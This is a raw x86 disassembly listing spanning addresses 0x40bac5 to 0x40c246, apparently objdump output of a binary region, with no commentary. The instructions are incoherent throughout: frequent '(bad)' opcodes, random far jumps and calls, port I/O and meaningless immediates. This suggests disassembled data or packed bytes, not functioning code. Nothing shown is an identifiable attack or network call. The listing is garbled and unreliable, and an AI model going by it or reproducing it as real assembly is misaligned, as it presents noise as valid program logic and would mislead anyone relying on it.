  40bac5:	bnd call 0x56232936
  40bacb:	in     eax,0x79
  40bacd:	sub    WORD PTR [ebx+esi*8],si
  40bad1:	mov    dh,0x35
  40bad3:	ss pop esi
  40bad5:	or     BYTE PTR [eax-0x7],bl
  40bad8:	sbb    dh,BYTE PTR [ebx]
  40bada:	pop    ds
  40badb:	inc    ebx
  40badc:	dec    eax
  40badd:	cmp    edx,DWORD PTR [eax+0x2c]
  40bae0:	pop    ecx
  40bae1:	or     ch,BYTE PTR [ebp+0x3a2c9405]
  40bae7:	jbe    0x40ba95
  40bae9:	push   cs
  40baea:	add    eax,0xa8e00014
  40baef:	cmp    al,0xca
  40baf1:	inc    esp
  40baf2:	inc    eax
  40baf3:	test   BYTE PTR [esi],bh
  40baf5:	push   0x8caa82d
  40bafa:	shl    ah,cl
  40bafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bafd:	in     al,0x12
  40baff:	and    cl,BYTE PTR [ebp-0x16241516]
  40bb05:	push   esi
  40bb06:	or     BYTE PTR [edi],dh
  40bb08:	push   esi
  40bb09:	push   edx
  40bb0a:	(bad)  
  40bb0b:	in     eax,dx
  40bb0c:	lea    eax,[edx]
  40bb0e:	gs cmc 
  40bb10:	lea    ebp,[eax-0x5b]
  40bb13:	add    DWORD PTR [edi],esp
  40bb15:	(bad)  [ebp-0x19eff897]
  40bb1b:	(bad)
  40bb1e:	jmp    0x253ac5b0
  40bb23:	mul    WORD PTR [edi+0x6d55e932]
  40bb2a:	cmp    eax,0x74817896
  40bb2f:	in     al,0x57
  40bb31:	ror    DWORD PTR [edi+0x6a9850c2],1
  40bb37:	and    eax,eax
  40bb39:	cmp    eax,0xd6b73542
  40bb3e:	sar    BYTE PTR [esi],cl
  40bb40:	retf   0x16db
  40bb43:	fnstcw WORD PTR [edx]
  40bb45:	adc    al,0x81
  40bb47:	dec    ebx
  40bb48:	(bad)  
  40bb4a:	sub    DWORD PTR [esi*2+0xab757be],eax
  40bb51:	adc    DWORD PTR [edx+edx*4-0x33],edx
  40bb55:	push   cs
  40bb56:	xor    DWORD PTR [edi+0x2a1ebeaa],esi
  40bb5c:	xlat   BYTE PTR ds:[ebx]
  40bb5d:	in     al,dx
  40bb5e:	jmp    0x2ee9dd9a
  40bb63:	outs   dx,DWORD PTR ds:[esi]
  40bb64:	ins    BYTE PTR es:[edi],dx
  40bb65:	ret    
  40bb66:	cmp    BYTE PTR [ecx+ebp*2+0x77cd077f],dl
  40bb6d:	cmc    
  40bb6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb6f:	push   ecx
  40bb70:	retf   0xa82a
  40bb73:	into   
  40bb74:	mov    al,ds:0x7d163460
  40bb79:	push   edi
  40bb7a:	xchg   esp,eax
  40bb7b:	dec    ecx
  40bb7c:	in     eax,0x78
  40bb7e:	sub    DWORD PTR [eax-0x22],ebx
  40bb81:	mov    dl,0xc4
  40bb83:	xchg   esi,eax
  40bb84:	add    DWORD PTR [eax-0x78b78db8],ebp
  40bb8a:	add    BYTE PTR [ebx-0x59],bl
  40bb8d:	call   0xec84:0x296e32c5
  40bb94:	push   0x1b
  40bb96:	scas   al,BYTE PTR es:[edi]
  40bb97:	sub    eax,0x59a665c7
  40bb9c:	stc    
  40bb9d:	sti    
  40bb9e:	data16 mov al,0x92
  40bba1:	mov    ah,0xcc
  40bba3:	sub    DWORD PTR [edx-0x674d0c],esi
  40bba9:	neg    DWORD PTR [ebx]
  40bbab:	inc    esp
  40bbac:	inc    esi
  40bbad:	pop    ebp
  40bbae:	dec    edx
  40bbaf:	das    
  40bbb0:	fst    QWORD PTR [ebp-0x55]
  40bbb3:	mov    al,ds:0xee7c2e6d
  40bbb8:	mov    dl,0xa
  40bbba:	mov    cl,0xc2
  40bbbc:	xor    ebp,ecx
  40bbbe:	dec    ecx
  40bbbf:	or     ah,BYTE PTR [eax-0x24]
  40bbc2:	xor    al,0xac
  40bbc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbc5:	jmp    FWORD PTR [edx-0x50906d74]
  40bbcb:	push   eax
  40bbcc:	push   ebx
  40bbcd:	adc    bl,BYTE PTR [ebx+0x33d5c184]
  40bbd3:	in     al,0x32
  40bbd5:	adc    al,al
  40bbd7:	jmp    0xc4da:0xb69bd6eb
  40bbde:	sti    
  40bbdf:	out    0x72,eax
  40bbe1:	js     0x40bb7c
  40bbe3:	iret   
  40bbe4:	cs ds out dx,eax
  40bbe7:	and    eax,0x2a41b30
  40bbec:	inc    eax
  40bbed:	pop    ecx
  40bbee:	aam    0x44
  40bbf0:	push   0x164ad487
  40bbf5:	xbegin 0xd2a36b17
  40bbfb:	and    eax,0x48382ab4
  40bc00:	pusha  
  40bc01:	add    BYTE PTR fs:[esi-0x7e],0x90
  40bc06:	icebp  
  40bc07:	jno    0x40bc43
  40bc09:	xchg   edi,eax
  40bc0a:	jmp    0x8091:0x47cad181
  40bc11:	push   esp
  40bc12:	clc    
  40bc13:	push   esi
  40bc14:	cmp    edi,DWORD PTR [esi-0x4c6f5bd0]
  40bc1a:	sub    DWORD PTR [esi+0x7d],esi
  40bc1d:	fistp  DWORD PTR [esi+ebp*4-0x541565b6]
  40bc24:	pop    eax
  40bc25:	shl    BYTE PTR [edi],0x2
  40bc28:	(bad)  [esi+esi*4-0x1]
  40bc2c:	mov    edi,0xb661ff0e
  40bc31:	dec    edx
  40bc32:	mov    ch,0x20
  40bc34:	mov    esp,0x350b50c2
  40bc39:	and    BYTE PTR [ecx-0x2d7be80],bl
  40bc3f:	(bad)  
  40bc40:	mov    ecx,0xeb8f33c4
  40bc45:	daa    
  40bc46:	lds    ecx,FWORD PTR [eax]
  40bc48:	loopne 0x40bc26
  40bc4a:	adc    al,0x66
  40bc4c:	xchg   edi,eax
  40bc4d:	adc    BYTE PTR [ebp-0x62c0940f],dl
  40bc53:	xchg   ecx,eax
  40bc54:	jmp    0x346ea5ff
  40bc59:	mov    esp,0x910d922e
  40bc5e:	xchg   ecx,eax
  40bc5f:	sub    al,0x49
  40bc61:	cmp    ah,BYTE PTR [ecx]
  40bc63:	push   esp
  40bc64:	popf   
  40bc65:	push   esp
  40bc66:	dec    ebp
  40bc67:	retf   
  40bc68:	adc    DWORD PTR [edi+0x66795ca],0x998855ee
  40bc72:	push   ebp
  40bc73:	(bad)  
  40bc74:	es dec ecx
  40bc76:	inc    edx
  40bc77:	jo     0x40bceb
  40bc79:	xchg   DWORD PTR [ecx],esp
  40bc7b:	or     al,0x6e
  40bc7d:	sar    ebx,cl
  40bc7f:	jecxz  0x40bcc4
  40bc81:	jg     0x40bc08
  40bc83:	inc    ebp
  40bc84:	add    DWORD PTR [edi],ebx
  40bc86:	push   esi
  40bc87:	mov    ah,BYTE PTR ds:0x948eb4fe
  40bc8d:	mov    edi,0x2589d90f
  40bc92:	push   0x4b82610d
  40bc97:	xor    ebp,DWORD PTR [edi+0x1e]
  40bc9a:	repnz inc eax
  40bc9c:	das    
  40bc9d:	leave  
  40bc9e:	out    0x88,eax
  40bca0:	xor    DWORD PTR [edx-0x5b],esp
  40bca3:	and    bh,BYTE PTR [ecx-0x7df80c17]
  40bca9:	add    eax,ebx
  40bcab:	ins    BYTE PTR es:[edi],dx
  40bcac:	xor    bl,BYTE PTR [eax]
  40bcae:	jle    0x40bc55
  40bcb0:	das    
  40bcb1:	jns    0x40bcaf
  40bcb3:	mov    WORD PTR [edi+0x64],gs
  40bcb6:	hlt    
  40bcb7:	stc    
  40bcb8:	jns    0x40bcd6
  40bcba:	mov    ds:0x85a5d76c,eax
  40bcbf:	fsubp  st(2),st
  40bcc1:	gs sub eax,0xf37f0e70
  40bcc7:	(bad)  
  40bcc8:	lock repnz mov al,ds:0xa3b90598
  40bccf:	jnp    0x40bcf8
  40bcd1:	mov    ds:0xf3aa9c58,al
  40bcd6:	mov    edi,0xfbe45f38
  40bcdb:	mov    ss,WORD PTR [eax+0x14]
  40bcde:	out    dx,eax
  40bcdf:	leave  
  40bce0:	bound  ecx,QWORD PTR [edi+esi*1+0x260fe267]
  40bce7:	cwde   
  40bce8:	jmp    0x5504:0xfb970ef6
  40bcef:	sbb    dl,bh
  40bcf1:	mov    WORD PTR [ebx+0x311fe757],?
  40bcf7:	pusha  
  40bcf8:	xor    BYTE PTR [eax],dl
  40bcfa:	inc    ecx
  40bcfb:	gs cmp ebp,edx
  40bcfe:	(bad)  
  40bcff:	cmp    eax,0x86417b42
  40bd04:	pop    edi
  40bd05:	ss (bad) 
  40bd07:	pop    es
  40bd08:	cmc    
  40bd09:	or     BYTE PTR [esi],bl
  40bd0b:	nop
  40bd0c:	jbe    0x40bd2a
  40bd0e:	jbe    0x40bcf1
  40bd10:	(bad)  
  40bd11:	das    
  40bd12:	cmp    DWORD PTR [edi+ecx*1+0x47bd3f9e],eax
  40bd19:	repnz mov WORD PTR [ebx+0x48],es
  40bd1d:	and    al,bh
  40bd1f:	ja     0x40bcac
  40bd21:	push   eax
  40bd22:	or     al,BYTE PTR [edx]
  40bd24:	xor    DWORD PTR [esi+0x82c32f4],ebx
  40bd2a:	dec    esi
  40bd2b:	test   al,0x9
  40bd2d:	cs xchg ah,al
  40bd30:	xor    cl,BYTE PTR [edx-0x2c]
  40bd33:	(bad)  [ebp+esi*8+0x3]
  40bd37:	sub    esp,eax
  40bd39:	xchg   ebx,eax
  40bd3a:	sub    BYTE PTR [ebx+0x6247e62e],dh
  40bd40:	mov    esi,0xb27c90e
  40bd45:	(bad)  ds:[ecx-0xe]
  40bd49:	(bad)  
  40bd4a:	rcl    cl,cl
  40bd4c:	dec    ecx
  40bd4d:	or     al,BYTE PTR [ebp-0x4d]
  40bd50:	or     al,0xc9
  40bd52:	push   eax
  40bd53:	rol    cl,cl
  40bd55:	mov    bl,0x66
  40bd57:	ret    
  40bd58:	pop    es
  40bd59:	sbb    esp,DWORD PTR [ebx]
  40bd5b:	jno    0x40bd07
  40bd5d:	push   edi
  40bd5e:	mov    ah,0x2c
  40bd60:	cmp    DWORD PTR [edx-0x2e],ebx
  40bd63:	int3   
  40bd64:	add    al,0xcd
  40bd67:	loop   0x40bd7b
  40bd69:	(bad)  
  40bd6a:	or     eax,0xff31fb02
  40bd6f:	jecxz  0x40bd89
  40bd71:	sti    
  40bd72:	sahf   
  40bd73:	mov    ?,WORD PTR [ebp+0x28]
  40bd76:	lea    esi,[edx+0x7d]
  40bd79:	test   BYTE PTR [edi],dh
  40bd7b:	push   0xe86dc203
  40bd80:	ficom  DWORD PTR [edx+0x2611ab24]
  40bd86:	mov    esp,esp
  40bd88:	sbb    cl,al
  40bd8a:	xor    BYTE PTR [edx+0x7b],al
  40bd8d:	in     eax,dx
  40bd8e:	das    
  40bd8f:	in     al,0x44
  40bd91:	jg     0x40bd2f
  40bd93:	in     eax,dx
  40bd94:	xor    ch,BYTE PTR [esi+0x14db9ac7]
  40bd9a:	fst    QWORD PTR ds:0x5f1b174c
  40bda0:	in     eax,dx
  40bda1:	mov    cs,WORD PTR [ebx+0x26]
  40bda4:	sub    esi,DWORD PTR [ebx-0x6a]
  40bda7:	inc    esp
  40bda8:	rol    ah,0xa
  40bdab:	mov    cl,0xe1
  40bdad:	adc    eax,0xa6520b45
  40bdb2:	lods   al,BYTE PTR ds:[esi]
  40bdb3:	fisttp QWORD PTR [ecx-0x31]
  40bdb6:	xor    edi,DWORD PTR [ecx+0x16]
  40bdb9:	rcl    BYTE PTR [ebp-0x7a],cl
  40bdbc:	mov    edx,0x64ad008e
  40bdc1:	and    DWORD PTR [edx-0x72],edi
  40bdc4:	push   esi
  40bdc5:	shl    DWORD PTR [edx],0xa5
  40bdc8:	push   edi
  40bdc9:	retf   
  40bdca:	sti    
  40bdcb:	inc    esi
  40bdcc:	sub    DWORD PTR [ecx],ecx
  40bdce:	dec    esi
  40bdcf:	push   ebx
  40bdd0:	pop    ecx
  40bdd1:	fnclex 
  40bdd3:	sbb    DWORD PTR [ebx],ebx
  40bdd5:	es (bad) 
  40bdd7:	adc    ebp,DWORD PTR [edx+0xe7d1eab]
  40bddd:	jnp    0x40bd64
  40bddf:	inc    ecx
  40bde0:	nop
  40bde1:	mov    cl,0xdc
  40bde3:	adc    eax,0x68cc6b3a
  40bde8:	fidiv  DWORD PTR [ebx]
  40bdea:	popfw  
  40bdec:	and    al,0x25
  40bdee:	inc    esp
  40bdef:	rcr    BYTE PTR [edi+ebx*4-0x5f],1
  40bdf3:	mov    WORD PTR [edx],gs
  40bdf5:	fs fcmovnu st,st(0)
  40bdf8:	dec    ebp
  40bdf9:	cld    
  40bdfa:	adc    eax,0xaae74653
  40bdff:	sar    DWORD PTR [ebp-0x63],1
  40be02:	mov    DWORD PTR [edx+0x789eed09],0xc8443468
  40be0c:	fisub  DWORD PTR fs:[ebp-0x5e]
  40be10:	aaa    
  40be11:	jle    0x40be37
  40be13:	sbb    ebx,DWORD PTR [ebx]
  40be15:	sbb    al,ah
  40be17:	sub    DWORD PTR [esi],ecx
  40be19:	cmc    
  40be1a:	jl     0x40be50
  40be1c:	rcr    BYTE PTR [edx],cl
  40be1e:	sti    
  40be1f:	loope  0x40bde1
  40be21:	mov    DWORD PTR [edi],ebx
  40be23:	mov    edi,0x92e49dbc
  40be28:	pop    ss
  40be29:	dec    ecx
  40be2a:	jle    0x40be56
  40be2c:	jmp    0xb6116b4a
  40be31:	mov    ch,0xf8
  40be33:	mov    ds:0xe92a7078,al
  40be38:	inc    edi
  40be39:	mov    ebx,0x649ef282
  40be3e:	sbb    cl,BYTE PTR [ebp-0x43f333ec]
  40be44:	pop    edi
  40be45:	in     al,0x11
  40be47:	sbb    BYTE PTR [ebx],al
  40be49:	push   ebp
  40be4a:	in     al,0x8f
  40be4c:	ficomp WORD PTR [edx]
  40be4e:	inc    edx
  40be4f:	sub    DWORD PTR [ebx+0x5a090d00],ecx
  40be55:	cmp    esi,0xf3745997
  40be5b:	js     0x40be4f
  40be5d:	jb     0x40be8c
  40be5f:	xor    BYTE PTR [edx+0x2ae52c42],cl
  40be65:	loope  0x40be46
  40be67:	mov    ebx,cs
  40be69:	inc    esi
  40be6a:	cmp    eax,0x28cb971c
  40be6f:	aas    
  40be70:	sbb    esi,ecx
  40be72:	ja     0x40be7c
  40be74:	jmp    0x6bc97ab8
  40be79:	(bad)  
  40be7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7b:	rol    BYTE PTR [eax],cl
  40be7d:	fwait
  40be7e:	mov    esp,0x4148c1fd
  40be83:	inc    ebx
  40be84:	inc    ecx
  40be85:	jge    0x40be21
  40be87:	xor    al,0x3c
  40be89:	jle    0x40bec5
  40be8b:	adc    al,0x32
  40be8d:	or     edi,edi
  40be8f:	jbe    0x40bf0c
  40be91:	push   0x3e
  40be93:	loop   0x40be6e
  40be95:	retf   
  40be96:	std    
  40be97:	(bad)  
  40be98:	or     dh,BYTE PTR [ebx+0x294f761]
  40be9e:	xor    DWORD PTR [edi+0x6c],edx
  40bea1:	pop    ebp
  40bea2:	mov    cl,0x7
  40bea4:	inc    ecx
  40bea5:	push   cs
  40bea6:	push   edx
  40bea7:	sbb    al,0x38
  40bea9:	fdivr  QWORD PTR [edx]
  40beab:	push   0x6e29a314
  40beb0:	pop    edx
  40beb1:	mov    cl,0x0
  40beb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beb4:	fld    DWORD PTR [esi-0x6f]
  40beb7:	aaa    
  40beb8:	ds leave 
  40beba:	xchg   esi,eax
  40bebb:	or     esi,esp
  40bebd:	mov    esi,0x75efd21e
  40bec2:	jl     0x40be8c
  40bec4:	pop    es
  40bec5:	in     al,dx
  40bec6:	ret    
  40bec7:	test   eax,0x4c500fd1
  40becc:	das    
  40becd:	and    al,0x97
  40becf:	nop
  40bed0:	pop    ebp
  40bed1:	inc    edi
  40bed2:	cwde   
  40bed3:	std    
  40bed4:	sbb    esi,0x21dec92
  40beda:	(bad)  
  40bedb:	call   0xe4015a5
  40bee0:	mov    eax,0xb7e7d8f3
  40bee5:	adc    bh,BYTE PTR [edi]
  40bee7:	ins    WORD PTR es:[edi],dx
  40bee9:	or     al,0xd0
  40beeb:	stos   DWORD PTR es:[edi],eax
  40beec:	cmp    eax,0xf8b287d4
  40bef1:	test   eax,0x9f6058f5
  40bef6:	adc    ebx,DWORD PTR ds:0x99c3587b
  40befc:	mov    ds:0xc4f21d93,al
  40bf01:	(bad)  
  40bf02:	mov    edi,0xc6c8079a
  40bf07:	pushf  
  40bf08:	cmc    
  40bf09:	push   ecx
  40bf0a:	inc    ebp
  40bf0b:	inc    ebx
  40bf0c:	jne    0x40beff
  40bf0e:	mov    ah,0x2b
  40bf10:	push   eax
  40bf11:	mov    al,ds:0xc3bca2f5
  40bf16:	jmp    FWORD PTR [eax]
  40bf18:	mov    dh,0x19
  40bf1a:	inc    esp
  40bf1b:	xchg   edx,eax
  40bf1c:	mov    es,WORD PTR [ebx]
  40bf1e:	jle    0x40bef3
  40bf20:	sub    DWORD PTR [edx+0x3417a1ea],ebx
  40bf26:	mov    BYTE PTR [edi+eiz*1-0x2b970dd3],al
  40bf2d:	adc    esi,edx
  40bf2f:	jnp    0x40bf01
  40bf31:	nop
  40bf32:	dec    edx
  40bf33:	mov    es,edx
  40bf35:	std    
  40bf36:	leave  
  40bf37:	jmp    0x2d44bada
  40bf3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf3d:	inc    ebx
  40bf3e:	fild   DWORD PTR [edi]
  40bf40:	rcl    DWORD PTR [ecx+0x5e],0xeb
  40bf44:	xchg   edx,eax
  40bf45:	jne    0x40bf45
  40bf47:	lock popa 
  40bf49:	push   cs
  40bf4a:	stc    
  40bf4b:	dec    eax
  40bf4c:	mov    eax,0x1e29f1db
  40bf51:	jmp    0x4450:0x6656f228
  40bf58:	pusha  
  40bf59:	mov    eax,ds:0xf1c3d751
  40bf5e:	ror    ah,cl
  40bf60:	fisubr WORD PTR [eax]
  40bf62:	adc    BYTE PTR [edi+0x77],0x69
  40bf66:	jae    0x40bef8
  40bf68:	mov    ecx,DWORD PTR [edx+0x1cf73d2f]
  40bf6e:	jl     0x40bfe8
  40bf70:	retf   0x6ca5
  40bf73:	sub    BYTE PTR [esp+eax*8-0x5819bd55],al
  40bf7a:	iret   
  40bf7b:	sbb    DWORD PTR [edi],ebp
  40bf7d:	mov    al,0x63
  40bf7f:	js     0x40bfda
  40bf81:	mov    edi,0xfd7c062d
  40bf86:	shr    edi,0xfe
  40bf89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf8a:	lods   eax,DWORD PTR ds:[esi]
  40bf8b:	ins    BYTE PTR es:[edi],dx
  40bf8c:	mov    ch,0x89
  40bf8e:	mov    esp,0x1cac5553
  40bf93:	lahf   
  40bf94:	jmp    0x9335:0x5fbff1df
  40bf9b:	dec    ebp
  40bf9c:	ins    DWORD PTR es:[edi],dx
  40bf9d:	cmp    bl,BYTE PTR [ebx+0x79153f29]
  40bfa3:	test   DWORD PTR [esi+0x39507514],ecx
  40bfa9:	pop    ecx
  40bfaa:	int    0x7a
  40bfac:	adc    dh,dh
  40bfae:	fimul  DWORD PTR [esi+ebp*4]
  40bfb1:	add    DWORD PTR [edi+edi*1+0x5c],ecx
  40bfb5:	sbb    ah,0x39
  40bfb8:	nop
  40bfb9:	mov    ds:0x61019f67,eax
  40bfbe:	sub    ebx,0x591a43f3
  40bfc4:	xor    BYTE PTR [esi+0x59],bl
  40bfc7:	daa    
  40bfc8:	adc    esp,DWORD PTR [edx]
  40bfca:	clc    
  40bfcb:	out    0xec,al
  40bfcd:	inc    eax
  40bfce:	out    dx,al
  40bfcf:	out    0x99,al
  40bfd1:	sub    eax,0x2c29b35d
  40bfd6:	(bad)  
  40bfd7:	imul   eax,DWORD PTR [ebx],0x6e
  40bfda:	xchg   esi,eax
  40bfdb:	cmp    DWORD PTR [esi+0x36],eax
  40bfde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfdf:	imul   edx,DWORD PTR [ecx-0x12a587b6],0xc6fe04d0
  40bfe9:	lahf   
  40bfea:	push   edx
  40bfeb:	out    0xf3,al
  40bfed:	in     al,dx
  40bfee:	mov    ss,WORD PTR [ecx+eax*2+0x41]
  40bff2:	push   eax
  40bff3:	jg     0x40c04b
  40bff5:	sub    edi,esi
  40bff7:	push   edi
  40bff8:	(bad)  
  40bff9:	retf   
  40bffa:	pusha  
  40bffb:	cmc    
  40bffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bffd:	push   eax
  40bffe:	push   ebx
  40bfff:	dec    ecx
  40c000:	add    DWORD PTR [ebp-0x3d5144fe],ebx
  40c006:	pushf  
  40c007:	rol    DWORD PTR [eax],cl
  40c009:	pushf  
  40c00a:	add    al,0xf8
  40c00c:	or     eax,0xba8fb461
  40c011:	test   eax,edx
  40c013:	sbb    al,0x1f
  40c015:	xor    DWORD PTR [ecx-0x20faf521],ebx
  40c01b:	(bad)  
  40c01c:	loopne 0x40bfc9
  40c01e:	push   cs
  40c01f:	sbb    ch,BYTE PTR [ebx+0x63]
  40c022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c023:	xchg   DWORD PTR [ebx+0x7d6ef06],ebp
  40c029:	xor    dl,BYTE PTR [ebx-0xda9c80f]
  40c02f:	ins    DWORD PTR es:[edi],dx
  40c030:	xor    BYTE PTR [esi],0xb8
  40c033:	shl    DWORD PTR [edx+0x3c210e33],1
  40c039:	dec    edi
  40c03a:	data16 lods al,BYTE PTR ds:[esi]
  40c03c:	mov    edi,0xbd873ab3
  40c041:	xor    DWORD PTR [eax],0xe480a6ff
  40c047:	and    eax,DWORD PTR [edi-0x5904d866]
  40c04d:	dec    eax
  40c04e:	dec    ebp
  40c04f:	out    dx,al
  40c050:	mov    bl,0xcd
  40c052:	out    dx,eax
  40c053:	(bad)  
  40c055:	pop    es
  40c056:	xor    cl,0xd9
  40c059:	push   ss
  40c05a:	push   esi
  40c05b:	js     0x40c06f
  40c05d:	inc    ebx
  40c05e:	pushf  
  40c05f:	lahf   
  40c060:	xor    eax,0xdf8ce5d8
  40c065:	in     eax,0xd4
  40c067:	ret    0xc0fa
  40c06a:	adc    bh,al
  40c06c:	jns    0x40c027
  40c06e:	or     edi,ecx
  40c070:	neg    BYTE PTR [edi+0x71]
  40c073:	push   ds
  40c074:	gs mov esp,0xa2ea6fe5
  40c07a:	adc    ch,ah
  40c07c:	arpl   WORD PTR [eax+edi*4],bp
  40c07f:	aaa    
  40c080:	xchg   BYTE PTR [eax-0x4],ah
  40c083:	xlat   BYTE PTR ds:[ebx]
  40c084:	std    
  40c085:	bound  ecx,QWORD PTR [ecx-0x20]
  40c088:	bound  edx,QWORD PTR [edx]
  40c08a:	or     DWORD PTR [ecx+0x30ff312f],0x50f98938
  40c094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c095:	test   BYTE PTR [ecx],0xc9
  40c098:	xchg   ecx,eax
  40c099:	push   ds
  40c09a:	jmp    0xac7a:0x839c8384
  40c0a1:	scas   al,BYTE PTR es:[edi]
  40c0a2:	xchg   ecx,eax
  40c0a3:	jl     0x40c05d
  40c0a5:	ins    DWORD PTR es:[edi],dx
  40c0a6:	mov    WORD PTR [edi+0x7195a51],gs
  40c0ac:	loop   0x40c0be
  40c0ae:	dec    esi
  40c0af:	push   0x78
  40c0b1:	ret    
  40c0b2:	or     DWORD PTR [edi-0x397ea604],0xffffff8c
  40c0b9:	repnz cmp eax,0x210a3983
  40c0bf:	mov    ebp,0x72ab7920
  40c0c4:	mov    ah,0xa8
  40c0c6:	daa    
  40c0c7:	push   es
  40c0c8:	pop    es
  40c0c9:	cmp    esp,edi
  40c0cb:	daa    
  40c0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0cd:	sub    edi,eax
  40c0cf:	cmp    dl,bl
  40c0d1:	push   cs
  40c0d2:	sbb    DWORD PTR [eax],esi
  40c0d4:	jp     0x40c13c
  40c0d6:	xchg   ebp,eax
  40c0d7:	add    DWORD PTR [ecx+esi*2],0x3a
  40c0db:	ror    DWORD PTR [ebx],cl
  40c0dd:	ds (bad) 
  40c0df:	push   ecx
  40c0e0:	push   edx
  40c0e1:	and    eax,0x8944cbeb
  40c0e6:	rcr    DWORD PTR [esi],0x66
  40c0e9:	mulps  xmm4,XMMWORD PTR [ecx-0x21]
  40c0ed:	daa    
  40c0ee:	pop    ebp
  40c0ef:	outs   dx,DWORD PTR ds:[esi]
  40c0f0:	xchg   ebx,eax
  40c0f1:	mov    ss,WORD PTR [ecx+0x38]
  40c0f4:	or     DWORD PTR [edi+0x28],edx
  40c0f7:	xor    DWORD PTR [ecx-0x4acdb181],eax
  40c0fd:	inc    edx
  40c0fe:	mov    ecx,0xf0ec911c
  40c103:	jbe    0x40c145
  40c105:	mov    edi,0xc500f126
  40c10a:	or     ecx,0x50
  40c10d:	jb     0x40c151
  40c10f:	mov    ch,0x31
  40c111:	cwde   
  40c112:	dec    esi
  40c113:	sub    edi,DWORD PTR [ebx]
  40c115:	pop    edi
  40c116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c117:	inc    esi
  40c118:	add    al,0xd0
  40c11a:	mov    dh,0x86
  40c11c:	aas    
  40c11d:	sbb    eax,0xa439bfbb
  40c122:	sbb    bh,BYTE PTR [eax]
  40c124:	jne    0xa696e912
  40c12a:	scas   al,BYTE PTR es:[edi]
  40c12b:	push   cs
  40c12c:	sbb    eax,DWORD PTR [edx-0xeacba60]
  40c132:	sti    
  40c133:	cmc    
  40c134:	test   ebp,ecx
  40c136:	aas    
  40c137:	mov    ds:0x9e7b037a,eax
  40c13c:	pop    es
  40c13d:	mov    bl,0xbb
  40c13f:	xchg   ebx,eax
  40c140:	arpl   bp,dx
  40c142:	pop    edx
  40c143:	mov    esp,0xb9cc32b4
  40c148:	out    0xba,eax
  40c14a:	idiv   BYTE PTR [ebx-0x4c]
  40c14d:	(bad)  
  40c14e:	fs xchg edx,eax
  40c150:	jp     0x40c162
  40c152:	jle    0x40c185
  40c154:	cmp    DWORD PTR [ecx+0x71],0xffffffae
  40c158:	(bad)  [edi-0x17]
  40c15b:	adc    al,BYTE PTR [edi-0x52b998b0]
  40c161:	mov    al,0x9e
  40c163:	es pop ecx
  40c165:	imul   edi,DWORD PTR [ebp+0x7f],0xf
  40c169:	(bad)  
  40c16a:	std    
  40c16b:	xchg   ebp,eax
  40c16c:	fisub  DWORD PTR [ebx]
  40c16e:	sub    al,BYTE PTR [ecx+0x5e1a4250]
  40c174:	jp     0x40c1e9
  40c176:	cdq    
  40c177:	and    cl,BYTE PTR ds:0x7f76a99d
  40c17d:	ret    
  40c17e:	jmp    0x80406e79
  40c183:	leave  
  40c184:	(bad)  
  40c185:	jno    0x40c128
  40c187:	push   0xf
  40c189:	test   BYTE PTR [eax-0x23],dl
  40c18c:	in     eax,0x66
  40c18e:	das    
  40c18f:	fdivr  st(6),st
  40c191:	cmp    ebp,DWORD PTR [esp+ebx*4-0x635ce053]
  40c198:	daa    
  40c199:	rol    DWORD PTR [esi-0x28739af6],0x30
  40c1a0:	retf   
  40c1a1:	xchg   esi,eax
  40c1a2:	mov    WORD PTR [ebx+0x6b],gs
  40c1a5:	imul   edx,edi,0x61cd295d
  40c1ab:	sbb    al,BYTE PTR [ebp+0x4cf5df70]
  40c1b1:	lds    ecx,FWORD PTR [esi-0x73]
  40c1b4:	lds    eax,FWORD PTR [esi+0x6b53ea71]
  40c1ba:	sub    BYTE PTR es:0xb265570e,dl
  40c1c1:	mov    ds:0xb8c0f72f,al
  40c1c6:	les    ecx,FWORD PTR [ecx]
  40c1c8:	ins    DWORD PTR es:[edi],dx
  40c1c9:	xchg   esp,eax
  40c1ca:	call   0x92b69c5d
  40c1cf:	jmp    0x40c165
  40c1d1:	inc    ecx
  40c1d2:	sub    eax,0x9e8bbd12
  40c1d7:	or     eax,0x702e037c
  40c1dc:	jp     0x40c1e8
  40c1de:	stc    
  40c1df:	cs pusha 
  40c1e1:	mov    es,WORD PTR [edi-0x6649c4ef]
  40c1e7:	jge    0x40c1d3
  40c1e9:	add    edi,eax
  40c1eb:	repnz out 0xc7,al
  40c1ee:	mov    dh,0xe9
  40c1f0:	mov    eax,ds:0x7995c163
  40c1f5:	and    DWORD PTR [ebp+0x2c],eax
  40c1f8:	and    DWORD PTR [ecx+0xf],ecx
  40c1fb:	xor    eax,0xf89b6a97
  40c200:	leave  
  40c201:	(bad)  
  40c202:	jb     0x40c1a6
  40c204:	(bad)  
  40c205:	dec    ebp
  40c206:	rcl    edi,0xb2
  40c209:	enter  0x8e12,0xe4
  40c20d:	loop   0x40c1f7
  40c20f:	adc    esp,ecx
  40c211:	dec    esp
  40c212:	pop    ds
  40c213:	outs   dx,DWORD PTR ds:[esi]
  40c214:	ret    0x2042
  40c217:	jb     0x40c1b2
  40c219:	in     eax,dx
  40c21a:	(bad)
  40c21f:	(bad)  
  40c220:	push   ss
  40c221:	or     edx,DWORD PTR [esi+0xb]
  40c224:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40c226:	mov    al,ds:0xcd6e0910
  40c22b:	das    
  40c22c:	(bad)  
  40c22d:	aas    
  40c22e:	scas   eax,DWORD PTR es:[edi]
  40c22f:	inc    edi
  40c230:	test   eax,0x1c03f012
  40c235:	test   al,0xb0
  40c237:	pushf  
  40c238:	jns    0x40c216
  40c23a:	fadd   DWORD PTR [ecx+ebx*2+0x20]
  40c23e:	in     al,0xbd
  40c240:	sub    al,0x3a
  40c242:	sbb    bh,bh
  40c244:	mov    bh,0xec
  40c246:	sub    DWORD PTR [ecx-0x69af4d4e],edx
